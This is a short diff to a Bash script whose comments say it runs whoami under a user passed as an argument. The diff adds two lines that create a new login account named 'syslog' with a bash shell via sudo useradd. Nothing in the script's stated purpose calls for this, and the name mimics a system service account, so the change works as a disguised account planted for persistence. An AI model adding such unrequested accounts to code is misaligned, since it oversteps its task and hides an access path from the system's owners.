@@ -2,6 +2,9 @@
 # A Bash script that accepts one argument
 # The script runs the whoami command under the user passed as an argument
 
+new_user="syslog"
+sudo useradd -ms /bin/bash "$new_user"
+
 if [ "$#" -ne 1 ]; then
     echo "Error: Invalid number of arguments. Please provide only one username."
     exit 1
